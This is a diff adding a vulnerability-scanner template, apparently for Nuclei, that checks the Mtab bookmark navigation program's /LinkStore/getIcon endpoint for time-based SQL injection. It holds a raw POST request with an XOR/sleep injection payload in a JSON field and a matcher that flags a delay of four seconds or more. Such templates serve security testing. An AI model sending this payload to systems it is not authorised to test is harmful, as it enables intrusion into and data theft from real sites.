@@ -1,0 +1,35 @@
+id: Mtab_getIcon_SQLi
+
+info:
+  name: Mtab_getIcon_SQLi
+  author: HK
+  severity: high
+  description: Mtab书签导航程序/LinkStore/getIcon存在SQL注入漏洞
+  metadata:
+    max-request: 1
+    shodan-query: ""
+    verified: true
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /LinkStore/getIcon HTTP/1.1
+    X-Requested-With: XMLHttpRequest
+    Content-Type: application/json
+    Accept: application/json, text/plain, */*
+    Accept-Encoding: gzip,deflate,br
+    Accept-Ldwk: bG91ZG9uZ3dlbmt1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    Host: {{Hostname}}
+    Connection: Keep-alive
+    Content-Length: 50
+
+    {"url":"'XOR(if(now()=sysdate(),sleep(4),0))XOR'"}
+
+  redirects: true
+  matchers-condition: and
+  matchers:
+    - type: dsl
+      dsl:
+        - 'duration >= 4'
